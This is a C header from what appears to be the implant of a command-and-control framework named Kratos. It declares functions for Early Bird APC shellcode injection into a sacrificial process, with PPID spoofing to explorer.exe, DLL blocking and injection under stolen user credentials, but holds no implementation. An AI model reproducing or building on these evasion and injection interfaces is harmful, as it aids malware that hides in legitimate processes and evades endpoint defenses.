#ifndef KRATOS_INJECT_H
#define KRATOS_INJECT_H

#include <windows.h>

#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_BLOCKDLLS)

/* Default sacrificial host process */
#define INJECT_DEFAULT_SPAWNTO "C:\\Windows\\System32\\notepad.exe"

/* Path of the sacrificial process. Updated by command_spawnto. */
extern char g_spawnto_path[512];

/* BlockDLLs state. Updated by command_blockdlls. Applied to all spawned processes. */
extern int g_blockdlls;

typedef struct {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  pid;
    char   output_file[MAX_PATH]; /* temp file path when capture_output=1, else empty */
} EarlyBirdResult;

/*
 * Early Bird APC injection into g_spawnto_path.
 * Spawns suspended, PPID-spoofs to explorer.exe, applies BlockDLLs if g_blockdlls set.
 * cmdline_override: full lpCommandLine string. If NULL, uses g_spawnto_path.
 * capture_output: if 1, redirects stdout/stderr to a temp file; caller reads out->output_file after process exit.
 * Returns 1 on success - caller owns out->hProcess, out->hThread (and pipe handles if any).
 * Returns 0 on failure - errmsg filled with reason.
 */
int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                     const char *cmdline_override,
                     int capture_output,
                     EarlyBirdResult *out, char *errmsg, size_t errmsg_len);

/*
 * Early Bird APC injection into g_spawnto_path, spawned under another user's credentials.
 * Uses CreateProcessWithLogonW with LOGON_WITH_PROFILE (full token, process runs as the target user).
 * domain: NetBIOS domain or "." for local account.
 * Returns 1 on success - caller owns out->hProcess and out->hThread.
 * Returns 0 on failure - errmsg filled with reason.
 */
int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                             const char *username, const char *domain, const char *password,
                             EarlyBirdResult *out, char *errmsg, size_t errmsg_len);

#endif /* INCLUDE_CMD_SPAWN || ... || INCLUDE_CMD_EXECUTE_ASSEMBLY || INCLUDE_CMD_BLOCKDLLS */

#endif /* KRATOS_INJECT_H */
